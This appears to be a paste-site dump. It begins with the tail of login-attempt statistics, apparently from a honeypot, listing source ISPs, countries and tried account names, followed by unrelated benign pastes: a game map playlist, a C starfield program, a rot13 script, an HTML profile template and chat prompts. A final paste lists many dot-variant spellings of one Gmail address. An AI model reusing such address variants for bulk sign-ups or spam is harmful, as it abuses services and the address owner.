    ""AS51167"": 2
  },
  ""isp"": {
    ""Shenzhen Tencent Computer Systems Company Limited"": 30,
    ""GoDaddy.com, LLC"": 41,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 68,
    ""China Telecom"": 56,
    ""Microsoft Corporation"": 57,
    ""Bresco Broadband"": 45,
    ""OVH SAS"": 6,
    ""Vivacom Bulgaria EAD"": 33,
    ""Chinanet"": 39,
    ""Lamerd Information & Communication Technology Co., ltd"": 12,
    ""DigitalOcean, LLC"": 32,
    ""Addresses CNNIC"": 13,
    ""Oracle Corporation"": 28,
    ""Aceville Pte.ltd"": 2,
    ""Censys, Inc."": 1,
    ""Vivo"": 7,
    ""China Mobile"": 31,
    ""Akamai Technologies"": 69,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Agata Grabowska trading as FUFO Studio"": 2,
    ""Pishtaze E Jadid Infomration Company"": 5,
    ""Flyservers S.A."": 1,
    ""Media Land LLC"": 1,
    ""FOP Dmytro Nedilskyi"": 10,
    ""Chunghwa Telecom Co., Ltd."": 15,
    ""DIGITALOCEAN"": 2,
    ""XHOST-INTERNET-SOLUTIONS"": 1,
    ""Akamai Technologies, Inc."": 22,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Long Van System Solution"": 1,
    ""Cogent Communications"": 3,
    ""Vietserver Services Technology Company Limited"": 362,
    ""Proton66 OOO"": 3,
    ""Rethem Hosting LLC"": 1,
    ""Google LLC"": 6,
    ""Cloudie Limited"": 6,
    ""AZ Viet NAM Communications Technology Company Limited"": 2,
    ""Contabo GmbH"": 2
  },
  ""org"": {
    ""Tencent Cloud Computing"": 30,
    ""Unknown"": 74,
    ""Chinanet XJ"": 37,
    ""Chinanet GS"": 46,
    ""Microsoft Azure Cloud (eastus)"": 57,
    ""Bresco Broadband"": 45,
    ""AVAST Software"": 6,
    ""Bulgarian Telecommunications Company Plc"": 33,
    ""Chinanet JS"": 49,
    ""DigitalOcean, LLC"": 34,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 26,
    ""Censys, Inc"": 1,
    ""TELEF\ufffdNICA BRASIL S.A"": 7,
    ""China Mobile Communications Corporation"": 31,
    ""Chinanet ZJ"": 31,
    ""Linode"": 91,
    ""Aliyun Computing Co., LTD"": 3,
    ""FUFO Studio"": 2,
    ""Vdsline"": 1,
    ""Media Land LLC"": 1,
    ""FOP Dmytro Nedilskyi"": 10,
    ""Chunghwa Telecom Co. Ltd."": 15,
    ""Xhost Internet Solutions"": 1,
    ""Starcrecium Limited"": 2,
    ""BlackHOST Ltd."": 3,
    ""Oracle Cloud Infrastructure (ap-mumbai-1)"": 2,
    ""Vietserver Viet NAM Service Technology Company Limited"": 362,
    ""Proton66 LLC"": 3,
    ""Rethem Hosting LLC"": 1,
    ""Palo Alto Networks, Inc"": 6,
    ""HK Mainstream Cloud Network Technology Limited"": 6,
    ""DULIEUAZ"": 2,
    ""Contabo GmbH"": 2
  },
  ""regionName"": {
    ""North West"": 101,
    ""Virginia"": 98,
    ""Xinjiang Uyghur Autonomous Region"": 37,
    ""Gansu"": 46,
    ""Ohio"": 45,
    ""Quebec"": 6,
    ""Sofia-Capital"": 33,
    ""Jiangsu"": 49,
    ""Tehran"": 17,
    ""California"": 23,
    ""Beijing"": 14,
    ""Sao Paulo"": 33,
    ""Michigan"": 1,
    ""Guangdong"": 31,
    ""Zhejiang"": 31,
    ""Shanghai"": 2,
    ""Mazovia"": 2,
    ""Provincia de Panama"": 1,
    ""St.-Petersburg"": 1,
    ""Kyiv City"": 10,
    ""Taipei City"": 15,
    ""England"": 2,
    ""North Holland"": 5,
    ""New Jersey"": 20,
    ""Moscow"": 5,
    ""Ho Chi Minh"": 3,
    ""Maharashtra"": 2,
    ""Tinh Hung Yen"": 362,
    ""South West"": 16,
    ""Illinois"": 1,
    ""Wan Chai"": 6,
    ""Bavaria"": 2
  },
  ""country"": {
    ""Singapore"": 117,
    ""United States"": 188,
    ""China"": 210,
    ""Canada"": 6,
    ""Bulgaria"": 33,
    ""Iran"": 17,
    ""Brazil"": 33,
    ""Poland"": 2,
    ""Panama"": 1,
    ""Russia"": 6,
    ""Ukraine"": 10,
    ""Taiwan"": 15,
    ""United Kingdom"": 2,
    ""Netherlands"": 5,
    ""Vietnam"": 365,
    ""India"": 2,
    ""Hong Kong"": 6,
    ""Germany"": 2
  },
  ""account"": {
    ""hello"": 599,
    ""142.93.8.59"": 389,
    ""(empty)"": 2,
    ""Domain"": 9,
    ""Administr"": 11,
    ""root"": 3,
    ""nmap"": 1,
    ""jhwCgUuMa"": 1,
    ""KGWiHV"": 1,
    ""XOLKFO"": 1,
    ""MJDmixugL"": 1,
    ""mmJhFN"": 1,
    ""lTnvHb"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1020
  },
  ""client_build"": {
    ""Unknown"": 1020
  },
  ""client_name"": {
    ""Unknown"": 1020
  },
  ""ip_type"": {
    ""hosting"": 232,
    ""Unknown"": 668,
    ""hosting & proxy"": 35,
    ""proxy"": 5,
    ""mobile"": 80
  }
}"
S1UGxs5q,PARKOUR PLAYLIST (download as txt),LEGENDBOSS123,JSON,Sunday 9th of July 2023 07:05:54 PM CDT,"[{""name"":""PARKOUR PLAYLIST"",""description"":""Playlist for all parkour maps by LEGENDBOSS123"",""maps"":[229232,495231,257098,462914,382092,491649,599408,258536,550853,749620,512981,435092,414284,419291,443696,661127,536244,529944,396140,604813,360367,267375,406380,734189,286010,248728,426651,661409,683179,474429,467085,203139,488116,591666,529043,482780,437985,502841,360308,369374,407032,346472,669954,176967,219164,209149,541995,594829,419513,832009,862229,914302,900853,932639,916445,892979,893099,888447,896670,891413,888458,436414,329385,657967,373688,589270,184537,306261,391987,589277,272456,367986,498935,373691,306275,184539,312087,589339,184538,613701,384415,282808,589343,272482,727679,731581,275478,589387,751169,278960,466179,445211,412575,728336,437394,590868,438137,751237,160239,447595,324209,670606,391865,373259,349711,391971,272473,438163,699804,650690,566488,349658,589287,546467,590797,438485,837081,728315,699140,790795,593705,751156,482926,566406,783278,721594,761064,819460,338244,751177,757584,657504,432497,751229,162187,373723,828137,699136,699149,657939,280099,365860,757590,412253,751217,358780,829897,184540,191203,729350,536331,179726,443964,751167,751170,751172,634948,590920,765770,272503,757634,370562,587158,284101,650696,284118,699129,699147,761110,657945,799004,726814,634916,751166,751168,751174,751175,751176,757593,408952,370555,529038,279206,438184,284342,743879,866526,373739,699133,614916,634889,823567,373784,634933,581431,751677,672831,822890,793208,358788,383133,804294,284107,184542,757737,633851,699903,595208,620808,593675,611597,547085,757773,757776,596241,657941,657942,597015,657948,592157,595235,597284,611621,657449,596275,597303,595259,615996,751165,657480,597320,613704,631883,596300,757581,561229,612430,616017,757585,657491,613719,757592,657499,757597,561245,616030,757600,757601,631905,611682,613730,757608,757609,613738,757610,757611,757614,689775,751216,613747,619635,626036,757625,757631,757633,544904,593823,650656,591012,650668,650672,592050,650677,400824,650682,650686,605130,593613,648910,605136,284114,605139,634839,593632,633827,634345,634353,635633,634356,592118,980262,957850,867431,817487,760111,964614,871690,849569,956812,461677,474290,492457,477351,475898,474169,483981,492392,474941,456569,456751,463943,463970,467987,463879,456774,491756,458837,597890,637248,596798,736880,735141,599356,595945,605070,690574,603691,684818,636282,669987,730420,717695,746416,695814,685719,641257,614361,565034,739960,627216,187226,612541,629449,758085,613676,561991,945676,961080,946525,947351,981508,982589,627430,161193,723167,743325,756353,753010,65308,54604,362882,126242,81937,127833,127386,52732,93626,128162,362926,129311,132354,103273,134940,142577,129747,616762,128494,134973,50301,124657,362864,362894,122029,509874,676136,361838,46161,78894,135610,52957,661086,16928,160810,361837,728492,110631,855967,711175,719390,145293,12610,680952,518391,635132,52736,541525,367478,99997,26732,517510,694257,697886,78392,636012,434830,12187,152578,243788,361823,224114,696726,675004,710610,720850,694263,723982,75844,630093,702573,113534,721390,125451,355864,82457,224085,105089,149242,107191,143819,75811,724058,48031,13759,32268,6669,16426,682086,130947,140182,52910,862531,77475,77866,150612,190827,152704,730811,736834,541543,130949,938375,80798,961469,428994,691398,848327,658895,937684,663783,47079,635880,803613,828185,809825,821958,853109,853162,908872,908870,759851,803682,805730,759042,759884,757641,745003,759269,771588,839957,747917,748515,819327,817822,821408,722492,710381,266104,711325,713811,718191,736524,617951,736146,698034,692004,802557,802538,323637,352496,299436,308985,307239,769326,287685,126033,748311,843696,794596,833285,855198,581210,829743,827475,853149,750566,860308,801984,823615,752425,760805,803501,766828,807167,391046,748283,470039,622855,724340,717364,623631,723909,586041,622841,622404,943615,717383,585841,883240,911442,60196,63793,59924,100796,128170,114496,122253,130833,135889,144198,145362,135655,151655,163477,154044,299919,220119,536741,364335,635451,437715,705680,663861,722588,398470,609532,603262,643660,616553,888184,927727,981079,977264,977163,977770,977773,980098,979531,977764,977767,977778,977782,983161,977786,907924,926115,991569,976593,928985,930286,560058,621183,546861,628343,746401,623283,726464,798954,719310,560211,591550,668607,577836,793182,562672,537006,750525,638987,815373,619298,895813,586609,664726,594617,769492,677082,821593,771855,567751,568553,751285,715628,687007,834307,805303,802862,963468,825069,980027,727708,729244,726479,321370,273198,563899,577701,536335,468853,493815,833717,22295,338053,21318,418460,21310,371655,759904,733704,731634,948811,885677,578194,606219,566818,688308,594585,629538,520918,597838,584235,552987,602145,559192,519818,594500,561251,780938,521707,620636,576757,559104,593083,550884,603670,575158,688168,643280,682094,642236,555701,677932,604949,599788,551791,641164,719565,638077,641408,636406,611124,605046,585577,606068,605078,831823,576659,587505,634400,605095,676444,833126,830550,873923,833252,715283,718275,713287,713304,878147,713247,717765,713256,717037,875862,929636,717029,880878,713259,875911,719512,719553,717032,715284,717737,716595,320179,872730,883209,320107,929285,886029,875822,320120,872749,883317,878809,933100,886025,883292,710749,320105,320106,711113,886023,886030,930313,886026,931084,886031,886033,879154,930375,108921,134807,134824,142338,702694,134832,170836,134015,143951,138304,185158,142345,143917,894703,142311,142341,138321,172425,227126,138312,329708,329705,329606,329602,329701,419901,383701,329674,329610,329641,329672,443028,383717,142356,383688,329683,329693,612690,329677,612684,904443,452619,612710,329604,620963,616356,329633,329663,383692,612685,329612,329630,613075,329620,389160,650291,329668,383736,616310,329623,626615,383705,613096,615754,620962,613864,613116,470059,935318,529122,383721,882224,960755,383746,804151,428975,383741,981930,383731,615671,231667,804842,263987,533797,808316,293027,553048,602167,530944,526414,584248,549877,523991,294555,801961,581299,525258,566426,608176,526582,548937,503939,526529,500678,491724,486650,823424,243794,541944,538903,539945,206372,409671,514574,710113,240022,287317,546180,547667,528701,561815,544858,501629,561288,840385,299898,520880,815368,287398,526346,268708,533682,562617,623371,863703,259363,410689,512107,520818,260487,550815,600744,553685,590300,707929,846733,287392,571151,335929,537053,535271,529689,409690,541061,534951,811476,226263,537007,562667,543491,747557,492874,809550,543078,809319,850829,529859,287437,578825,529974,822597,565091,742798,572053,261781,508152,807727,569662,741235,522648,712365,869843,248287,835824,529954,262238,287407,828881,413162,411431,883286,453512,563596,883618,458217,475285,474513,868341,315528,332460,362069,241180,366700,406145,242384,381159,380397,242259,241176,826308,122336,186559,87566,103403,107840,127130,130072,184355,127131,127133,333405,912210,912178,333325,912176,565025,912177,912202,406331,912200,382355,912179,912214,912223,912180,912205,600862,912174,912182,596860,564129,912173,912175,912183,461880,912198,912203,299996,913892,913893,913895,912219,564117,603847,579025,913903,614677,692153,546237,677345,913890,460836,598077,598097,607126,984249,630214,961235,913891,913905,913907,913911,123974,123961,281157,312098,308514,271007,115552,263461,326186,297968,120243,117943,772891,747921,784211,765355,742577,930841,757944,792393,766380,807114,757952,941634,941338,942420,941512,941411,941494,941545,942175,941575,941519,941628,941561,941332,941571,941372,941359,941327,941390,942481,941363,942496,942370,941753,941624,942088,942681,943198,942743,942697,941326,953881,947289,942823,942511,942829,943190,943648,942721,953800,944365,943751,954313,953485,953810,944320,953909,954355,953813,953849,960309,960932,960811,960861,954550,961106,957834,957908,960242,958965,969420,960331,957838,967134,971902,957919,954856,972275,957864,957818,957826,954936,957878,955005,952952,954561,973150,961118,973144,957817,974329,521726,519908,520672,521526,520823,525304,520775,519781,520892,521682,632559,291404,298250,291398,704587,549791,537017,538905,705817,858933,694338,385119,385120,516273,518617,703738,911396,74645,113267,106148,638393,98553,102957,110771,646381,630925,106150,635677,644582,628928,592289,588490,95661,420072,218488,113891,865720,292031,705172,762217,236566,903736,698464,875497,749365,159207,207410,719209,490293,160975,231908,893445,893447,893454,893456,893457,893460,893468,893604,893443,893600,937721,893444,893446,894090,893598,893599,893601,893605,893439,893442,893458,893596,893613,893436,893441,893459,893465,893466,893469,894089,894091,893602,893603,937720,549882,810596,811601,811445,811450,811629,833752,830427,830456,830464,831106,830422,569820,488341,747927,789799,430379,434026,633801,457042,432183,447675,495572,718304,750685,741240,774427,570159,628620,570026,596166,549541,460198,749735,431112,507279,492974,779461,553753,858601,763288,762308,781638,802428,505575,728298,544264,791898,553098,607122,552959,592432,636493,620943,475442,407508,405512,411453,392191,401866,404751,382644,385581,385580,486046,650322,782295,772494,757460,777419,783829,764496,879398,880359,896646,775125,879397,753524,762261,811433,812869,824469,820669,834150,453568,132908,132905,132906,132914,481100,406182,481102,132904,132907,596751,453565,406183,132912,132911,384199,132913,666576,481101,666577,109450,110070,130566,595726,237020,81952,133244,642006,239897,81421,422250,551603,635396,635351,635340,632020,635346,872941,882759,632021,742761,672540,569471,770480,808507,532159,685869,788914,771004,627089,729381,539944,658987,540949,960600,511204,515312,534794,657312,659972,741143,515388,966734,657252,514459,814492,561144,561238,648453,705308,650572,668759,563968,966697,720027,758207,696891,649456,966733,664206,967427,722064,967493,967492,966729,967424,959274,967494,760145,963706,967419,967425,967426,967428,967429,967430,967431,967432,967433,967434,967441,967444,967446,967448,966693,966704,966705,966706,964670,964673,967489,964674,967491,705349,966727,966728,967498,966736,966745,967517,966753,966755,966758,966762,966765,966769,966772,966774,966778,963717,760233,961198,714700,967420,967422,137849,300791,776357,838525,723842,664681,684932,287634,663922,685007,692290,287580,773908,664087,436204,182044,239038,239037,365322,264147,477354,239079,505173,279249,380781,195821,442843,383373,197551,383337,356264,291838,429575,196454,534047,778564,454082,365997,283386,446092,311192,191484,469836,268852,262258,519832,392369,378912,281605,267295,766192,403726,433029,586834,493477,401875,279251,281578,779281,480275,368726,264324,210996,476232,354213,420592,690674,509436,478525,479951,400628,469823,587755,469815,765504,187487,396411,387458,291857,180059,483184,260790,345795,506315,535050,265772,356263,290520,198947,639294,738183,361405,346327,311303,348713,180011,472176,318846,428694,730551,273143,763725,392547,472201,365974,289201,333761,484296,584687,407323,339257,395327,383297,437428,405472,398600,475416,775193,416289,291902,773694,586825,467094,362647,251049,415151,314318,472279,570082,390629,753638,255210,773618,393495,397605,756266,438105,369547,472211,690580,734617,211124,296633,517819,403388,473544,429004,473549,473554,418259,435155,749015,557051,747568,737420,756244,763817,816670,753598,736873,792251,968792,968835,971249,968832,972007,970333,938169,959648,960525,960561,966853,963119,961590,964781,944064,961585,961577,710161,792110,792108,792109,392607,439978,476162,380540,425285,389462,374376,492688,683313,444826,460958,375840,514662,511889,510124,510987,494988,513922,129583,966682,37533,159352,26443,35708,43039,132438,165012,40574,143619,789718,179653,263454,117915,179437,428876,626698,648142,737849,610895,657780,662100,565698,337503,421218,111578,40516,23286,147700,118639,53959,36977,226948,263264,109848,270551,231969,294509,238670,295873,918115,911933,912161,926112,911352,911358,912163,914840,926123,924096,924109,911925,911942,917112,924080,920523,911380,940604,924130,911350,914838,923809,926124,926128,938196,939919,924090,939910,939922,914852,926138,940556,775366,727558,730241,783682,569574,662483,550618,573453,508971,549728,485259,597650,510784,511008,555517,550753,673157,592943,477245,511916,673156,718251,508125,381263,282591,285659,310804,316515,281576,331975,265226,275202,274354,377779,279039,294911,330935,294660,276908,310798,308350,323085,301208,263221,261636,263241,916463,916464,893639,686519,903328,837131,939138,938378,941732,934068,675524,941786,938747,189753,339102,427009,331542,331744,331533,331526,331530,331516,153943,331734,338013,331740,331562,331750,331513,331570,338014,331567,338016,338019,343856,255884,872042,946399,948049,947820,949951,946393,947959,949882,949958,946396,946400,948988,947837,946514,948051,946398,947250,948997,947244,947247,947261,950113,947808,950121,946516,946527,946537,947201,950979,855494,946522,947117,949942,951002,941787,950984,949685,948923,948929,948931,948932,949735,949742,479380,479373,492483,485268,908686,908819,48966,678587,678584,678583,678588,678582,678591,678585,678595,678581,678590,678593,678592,678594,767365,744718,739885,763719,769434,766467,765348,766676,768880,749993,962591,963639,973912,972133,767194,99899,100843,100038,446239,112305,100784,7622,101652,101623,110222,100151,100485,114336,598837,687907,6128,692905,53811,106186,627158,105500,152647,850486,96216,48070,445848,445087,444924,105498,527590,528218,499624,662194,697936,610712,445212,445213,445999,819765,935744,447880,448907,861857,861865,445866,447952,894182],""b1maps"":[]}]"
2N8SuQ0H,ascii_galaxy.c,channel_t,C,Sunday 9th of July 2023 07:02:09 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define WIDTH 201
#define CHAR_NUM 5

int main() {
    // ASCII characters to use
    char chars[CHAR_NUM] = {'*', '+', '.', 'o', '#'};

    srand(time(0)); // Seed the random number generator

    while (1) {
        int random_space = rand() % WIDTH; // Calculate random space
        int random_char = rand() % CHAR_NUM; // Select random character from chars array

        for (int i = 0; i < random_space; i++) {
            printf("" "");
        }

        printf(""%c\n"", chars[random_char]);

        usleep(250000); // Sleep for 0.25 seconds
    }

    return 0;
}
"
NZF6jUtV,Rot13 Python Script (Useful Enough For Me),XenoTheStrange,Python,Sunday 9th of July 2023 06:08:35 PM CDT,"#!/usr/bin/python3
import os
import sys
import codecs

def rot(msg):
    return codecs.encode(msg, ""rot13"")

def parse_arguments():
    infile = None
    outfile = None
    log_to_terminal = True
    msg = """"
    for i, arg in enumerate(sys.argv[1:]):
        if arg == ""-i"": #input file
            msg += open(sys.argv[i+2], ""r"").read() + ""\n""
        elif arg == ""-s"": #silent
            log_to_terminal = False
        elif arg == ""-t"": #input text
            msg += sys.argv[i+2] + ""\n""
        elif arg == ""-o"": #output file
            outfile = sys.argv[i+2]
    if msg == """":
        print(""No text was entered to be encoded. Please add text using -t \""text\"" or -i \""/path/to/file\"""")
    return infile, outfile, log_to_terminal, msg

def main(infile, outfile, log_to_terminal, msg):
    if not infile == None:
        msg = open(infile, ""r"").read()
    out = rot(msg)
    if log_to_terminal:
        print(out);
    if not outfile == None:
        file = open(outfile, ""w"")
        file.write(out)
        file.close()

if __name__ == ""__main__"":
    if ""--help"" in sys.argv:
        print(""""""Usage: ./script.py [-option] [data]\n  -i input file path\n  -s do not print output in terminal\n  -t input text\n  -o output to file path\n\nMultiple -t and -i options can be used. Each instance will be seperated by a new line."""""")
        exit()
    infile, outfile, log_to_terminal, msg = parse_arguments()
    main(infile, outfile, log_to_terminal, msg)
"
hPJdFQJx,[F2U TH CODE] CREATURE INTERSECTION 2.0,4ngelbugz,HTML,Sunday 9th of July 2023 05:56:12 PM CDT,"<!--
      CREATURE INTERSECTION 2.0
      free html character profile by juette
      
      RULES:
      1) dont remove the credit or edit the link so people can find this easily
      2) feel free to edit or mix it with other codes as long as the other codes' makers are ok with it and you dont redistribute it
      3) please comment on the forum post if you use! i wanna see the results! https://toyhou.se/~forums/16.htmlcss-graphics/153697
      
      the grass pattern can be swapped for a different one from this gallery (or any other pattern you wish) -> https://toyhou.se/22389615.creature-intersection-20/gallery
      to do this, simply copy the image url to the one you'd like to use, then CTRL+F on the following link to replace it with the pattern of your choosing -> https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png
      
      CTRL+F to change the following colors
      title text color -> #EDB60A
      title text border color -> rgb(135, 88, 18)
      
      
-->

<div class=""container-fluid px-0 mt-lg-4"" style=""max-width:1000px;"">
<div class=""card card-block p-2 mx-1 p-lg-3 mt-lg-4 border-0 rounded-0"" style=""background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png);"">
<div class=""row"">
<div class=""col-12 col-lg-5 my-2"">
    <div class=""card card-block p-2 p-lg-3 border-0 rounded-0 text-center"">
      <div style=""min-height:630px"">
        <div class=""card card-block m-2 border-0 rounded-0"" style=""background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png);"">
            <h2 style=""color:#EDB60A;font-size:1.9rem;font-weight:800;
            text-shadow: rgb(135, 88, 18) 2px 0px 0px, rgb(135, 88, 18) 1.75517px 0.958851px 0px, rgb(135, 88, 18) 1.0806px 1.68294px 0px, rgb(135, 88, 18) 0.141474px 1.99499px 0px, rgb(135, 88, 18) -0.832294px 1.81859px 0px, rgb(135, 88, 18) -1.60229px 1.19694px 0px, rgb(135, 88, 18) -1.97999px 0.28224px 0px, rgb(135, 88, 18) -1.87291px -0.701566px 0px, rgb(135, 88, 18) -1.30729px -1.51361px 0px, rgb(135, 88, 18) -0.421592px -1.95506px 0px, rgb(135, 88, 18) 0.567324px -1.91785px 0px, rgb(135, 88, 18) 1.41734px -1.41108px 0px, rgb(135, 88, 18) 1.92034px -0.558831px 0px;"">
              NAME
            </h2>
        </div>
        <div class=""card-block m-2 mt-4 p-0 border-0 rounded-0"">
          <!-- main image below -->
          <img src=""https://dodo.ac/np/images/5/58/K.K._Slider_PG.png"">
          <!-- main image above -->
        </div>
        <div class=""card card-block border-0 rounded-0 m-auto text-uppercase"">
            <h4 style=""font-weight:600"">""PICTURE QUOTE HERE""</h4>
        </div>
    </div>
    </div>
</div>
  <div class=""col-12 col-lg-7 my-2"">
    <div class=""card card-block p-2 p-lg-3 mb-2 border-0 rounded-0"">
      <div style=""max-height:630px;overflow-y:auto"">
        <div class=""card card-block m-2 border-0 rounded-0 text-center"" style=""background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png);"">
            <h2 style=""color:#EDB60A;font-size:1.9rem;font-weight:800;
            text-shadow: rgb(135, 88, 18) 2px 0px 0px, rgb(135, 88, 18) 1.75517px 0.958851px 0px, rgb(135, 88, 18) 1.0806px 1.68294px 0px, rgb(135, 88, 18) 0.141474px 1.99499px 0px, rgb(135, 88, 18) -0.832294px 1.81859px 0px, rgb(135, 88, 18) -1.60229px 1.19694px 0px, rgb(135, 88, 18) -1.97999px 0.28224px 0px, rgb(135, 88, 18) -1.87291px -0.701566px 0px, rgb(135, 88, 18) -1.30729px -1.51361px 0px, rgb(135, 88, 18) -0.421592px -1.95506px 0px, rgb(135, 88, 18) 0.567324px -1.91785px 0px, rgb(135, 88, 18) 1.41734px -1.41108px 0px, rgb(135, 88, 18) 1.92034px -0.558831px 0px;"">
              BASICS
            </h2>
        </div>
        <div class=""col-12 mt-3 mb-4"">
    		    <b class=""text-uppercase mr-2"">species</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">personality</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">pronouns</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">birthdate</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">catchphrase</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">initial clothing</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">initial umbrella</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">home request</b> Info
            <!-- more lines: 
            <hr>
            <b class=""text-uppercase mr-2"">field</b> Info
            -->
    	</div>
    	<div class=""card card-block m-2 mt-4 border-0 rounded-0 text-center"" style=""background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png);"">
            <h2 style=""color:#EDB60A;font-size:1.9rem;font-weight:800;
            text-shadow: rgb(135, 88, 18) 2px 0px 0px, rgb(135, 88, 18) 1.75517px 0.958851px 0px, rgb(135, 88, 18) 1.0806px 1.68294px 0px, rgb(135, 88, 18) 0.141474px 1.99499px 0px, rgb(135, 88, 18) -0.832294px 1.81859px 0px, rgb(135, 88, 18) -1.60229px 1.19694px 0px, rgb(135, 88, 18) -1.97999px 0.28224px 0px, rgb(135, 88, 18) -1.87291px -0.701566px 0px, rgb(135, 88, 18) -1.30729px -1.51361px 0px, rgb(135, 88, 18) -0.421592px -1.95506px 0px, rgb(135, 88, 18) 0.567324px -1.91785px 0px, rgb(135, 88, 18) 1.41734px -1.41108px 0px, rgb(135, 88, 18) 1.92034px -0.558831px 0px;"">
              FAVORITES
            </h2>
        </div>
        <div class=""col-12 mt-3 mb-4"">
            <b class=""text-uppercase mr-2"">coffee</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">style</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">color</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">song</b> Info
            <hr>
            <b class=""text-uppercase mr-2 mb-4"">hobby</b> Info
            <!-- more lines: 
            <hr>
            <b class=""text-uppercase mr-2"">field</b> Info
            -->
    	</div>
    	<div class=""card card-block m-2 mt-4 border-0 rounded-0 text-center"" style=""background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/67602370_fvPwwg2KQRR2mn9.png);"">
            <h2 style=""color:#EDB60A;font-size:1.9rem;font-weight:800;
            text-shadow: rgb(135, 88, 18) 2px 0px 0px, rgb(135, 88, 18) 1.75517px 0.958851px 0px, rgb(135, 88, 18) 1.0806px 1.68294px 0px, rgb(135, 88, 18) 0.141474px 1.99499px 0px, rgb(135, 88, 18) -0.832294px 1.81859px 0px, rgb(135, 88, 18) -1.60229px 1.19694px 0px, rgb(135, 88, 18) -1.97999px 0.28224px 0px, rgb(135, 88, 18) -1.87291px -0.701566px 0px, rgb(135, 88, 18) -1.30729px -1.51361px 0px, rgb(135, 88, 18) -0.421592px -1.95506px 0px, rgb(135, 88, 18) 0.567324px -1.91785px 0px, rgb(135, 88, 18) 1.41734px -1.41108px 0px, rgb(135, 88, 18) 1.92034px -0.558831px 0px;"">
              BIOGRAPHY
            </h2>
        </div>
        <div class=""col-12 mt-3 mb-4"">
            <b class=""text-uppercase mr-2"">siblings</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">skill</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">goal</b> Info
            <hr>
            <b class=""text-uppercase mr-2"">halloween fear</b> Info
            <!-- more lines: 
            <hr>
            <b class=""text-uppercase mr-2"">field</b> Info
            -->
    	</div>
    </div>
    </div>
  </div>
</div>
</div>
<p class=""text-right small""><a href=""https://toyhou.se/22389615"">HTML by juette</a></p>
</div>"
g9Fpf8KG,!prompt,palmtreetop,JSON,Sunday 9th of July 2023 05:44:06 PM CDT,"[`what was your very first video game?`,
`who are some of your favorite video game characters?`,
`what is a game you think people are sleeping on?`,
`what's a guilty pleasure game of yours?`,
`who is a video game character you feel your personality is most like?`,
`who are some of the most annoying video game characters to you?`,
`who is your favorite video game couple?`,
`what game soundtracks are a true bop?`,
`did a game ever make you cry? (avoid spoilers if you can)`,
`what's a game you can never get tired of playing?`,
`if you're stuck in bed with a bad cold, what's a handheld game you'd recommend?`,
`what is a game you think everyone should play at least once in their lifetime?`,
`what's a game you KNOW you have over 100 hours logged for it?`,
`what games have cutscenes you don't actually skip (esp. on a second playthrough)?`,
`which video game world's environment would you love to live in?`,
`what are your favorite genre of games?`,
`what game(s) had a disappointing sequel to you?`,
`which game(s) do you feel have a unique art style?`,
`what's a game you're looking forward to playing?`,
`is there a game you think has stellar voice acting?`,
`are there any life lessons you picked up from playing games?`,
`what's a game you think that would translate well to a movie or a book?` (bonus if it hasn't been done yet),
`what's a game you thought you wouldn’t like, but ended up loving?`,
`do you have a #1 favorite game of all time?`]"
Xr1avJJg,!break,palmtreetop,JSON,Sunday 9th of July 2023 05:15:47 PM CDT,"[`🪟 don't forget to take a break every now and then, capitan`,
`🪟 relax for a moment - you’ve made it this far! take that in`,
`🪟 inhale confidence, exhale doubt`,
`🪟 take a breather - eat some hot chip`,
`🪟 just relax, man...relax...`]"
RAQAX83F,GPL Stage,bombaires,HTML,Sunday 9th of July 2023 03:54:06 PM CDT,"<a href=""mailto:support@gplstage.com"">support@gplstage.com</a>
<a href=""mailto:c2697846@gmail.com"">c2697846@gmail.com</a>
<a href=""mailto:c26.97.8.4.6@gmail.com"">c26.97.8.4.6@gmail.com</a>
<a href=""mailto:c.2697.846@gmail.com"">c.2697.846@gmail.com</a>
<a href=""mailto:c.26.9.7.84.6@gmail.com"">c.26.9.7.84.6@gmail.com</a>
<a href=""mailto:c2.697.84.6@gmail.com"">c2.697.84.6@gmail.com</a>
<a href=""mailto:c.2.6.97.846@gmail.com"">c.2.6.97.846@gmail.com</a>
<a href=""mailto:c.2.6.9.784.6@gmail.com"">c.2.6.9.784.6@gmail.com</a>
<a href=""mailto:c26.9.7846@gmail.com"">c26.9.7846@gmail.com</a>
<a href=""mailto:c.2.69.7.846@gmail.com"">c.2.69.7.846@gmail.com</a>
<a href=""mailto:c2.6.9.784.6@gmail.com"">c2.6.9.784.6@gmail.com</a>
<a href=""mailto:c2.6.978.46@gmail.com"">c2.6.978.46@gmail.com</a>
<a href=""mailto:c26.97.84.6@gmail.com"">c26.97.84.6@gmail.com</a>
<a href=""mailto:c.2697.8.46@gmail.com"">c.2697.8.46@gmail.com</a>
<a href=""mailto:c26.9.7.8.4.6@gmail.com"">c26.9.7.8.4.6@gmail.com</a>
<a href=""mailto:c2697846@gmail.com"">c2697846@gmail.com</a>
<a href=""mailto:c.2.69.78.46@gmail.com"">c.2.69.78.46@gmail.com</a>
<a href=""mailto:c26.9784.6@gmail.com"">c26.9784.6@gmail.com</a>
<a href=""mailto:c.2.69.7.84.6@gmail.com"">c.2.69.7.84.6@gmail.com</a>
<a href=""mailto:c269.78.46@gmail.com"">c269.78.46@gmail.com</a>
